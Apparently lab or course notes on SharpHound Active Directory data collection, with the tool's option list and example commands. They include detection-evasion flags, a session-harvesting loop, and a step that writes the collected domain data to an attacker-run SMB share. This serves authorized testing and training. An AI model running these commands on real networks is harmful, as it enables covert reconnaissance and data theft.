# 04.13 SharpHound Data Collection

> Collect Group/LocalAdmin/Session/ACL data with `SharpHound.exe` — use `DCOnly` for stealth and `--Loop` for transient sessions.

## Overview

SharpHound is the official C# BloodHound collector. Default collection covers Group, LocalAdmin, Session, Trusts, ACL, Container, RDP, ObjectProps, DCOM, SPNTargets, PSRemote. DCOnly limits traffic to the DC — best for monitored environments. Session data is transient: use --Loop to catch active sessions over time. Output is a ZIP of JSON files uploaded to the BloodHound GUI.

## Steps

- **Default collection** — run `SharpHound.exe` with no options from a domain-joined machine.
- **DCOnly** — LDAP queries to DC only; no connections to workstations. Best for stealth.
- **--memcache** — keep cache in RAM, no .bin file written to disk.
- **--randomfilenames + --outputprefix** — randomize output filenames to evade name-based detection.
- **--zippassword** — password-protect the ZIP; must unzip before importing to BloodHound.
- **--Loop with -c Session** — repeatedly enumerate sessions to catch transient logins.
- **runas /netonly** — run SharpHound from a non-domain-joined machine with injected credentials.
- **--excludedcs** — exclude DCs from session/localgroup enumeration to avoid ATA/ATP detection.

## Commands

### SharpHound full option reference (v1.1.0 --help)

```text
  -c, --collectionmethods      (Default: Default) Collection Methods:
      Group, LocalGroup, LocalAdmin, RDP, DCOM, PSRemote, Session, Trusts,
      ACL, Container, ComputerOnly, GPOLocalGroup, LoggedOn, ObjectProps,
      SPNTargets, Default, DCOnly, All
  -d, --domain                 Specify domain to enumerate
  -s, --searchforest           Search all available domains in the forest
  --stealth                    Stealth Collection (Prefer DCOnly whenever possible!)
  --computerfile               Path to file containing computer names to enumerate
  --outputdirectory            (Default: .) Directory to output file to
  --outputprefix               String to prepend to output file names
  --memcache                   Keep cache in memory and don't write to disk
  --rebuildcache               Rebuild cache and remove all entries
  --randomfilenames            Use random filenames for output
  --zippassword                Password protects the zip with the specified password
  --trackcomputercalls         Adds a CSV tracking requests to computers
  --ldapusername               Username for LDAP
  --ldappassword               Password for LDAP
  --domaincontroller           Override domain controller to pull LDAP from
  --secureldap                 Connect to LDAP SSL instead of regular LDAP
  --disablecertverification    Disables certificate verification when using LDAPS
  --disablesigning             Disables Kerberos Signing/Sealing
  --skipportcheck              Skip checking if 445 is open
  --portchecktimeout           (Default: 500) Timeout for port checks in ms
  --excludedcs                 Exclude DCs from session/localgroup enumeration
  --throttle                   Add a delay after computer requests in ms
  --jitter                     Add jitter to throttle (percent)
  --threads                    (Default: 50) Number of enumeration threads
  -l, --Loop                   Loop computer collection
  --loopduration               Loop duration (Default: 2 hours)
  --loopinterval               Delay between loops
  --collectallproperties       Collect all LDAP properties from objects
  -v                           (Default: 2) Enable verbose output
```

### Basic default collection

```text
C:\tools> SharpHound.exe
```

### Stealth — output to SMB share with evasion flags

```bash
# On attacker (Kali) — start SMB share:
sudo impacket-smbserver share ./ -smb2support -user test -password test

# On target — mount share and run SharpHound:
C:\htb> net use \\10.10.14.33\share /user:test test
C:\htb> C:\Tools\SharpHound.exe --memcache --outputdirectory \\10.10.14.33\share\ --zippassword HackTheBox --outputprefix HTB --randomfilenames

# On attacker — unzip before importing (BH can't read password-protected ZIPs):
unzip ./HTB_20230111113143_5yssigbd.w3f   # password: HackTheBox
```

### Session loop — catch transient logins over 1 hour

```text
C:\Tools> SharpHound.exe -c Session --loop --loopduration 01:00:00 --loopinterval 00:01:00
```

### From non-domain-joined machine (runas /netonly)

```text
# Spawn cmd.exe with domain credentials for network auth:
C:\htb> runas /netonly /user:<DOMAIN>\<USER> cmd.exe
# password: HTBRocks!

# Verify authentication:
C:\htb> net view \\<DOMAIN>.htb\

# Run SharpHound in the runas-spawned shell:
C:\Tools> SharpHound.exe -d <DOMAIN>.htb
# NOTE: runas /netonly does NOT validate credentials at run time —
# wrong credentials are only discovered on first network connection.
```
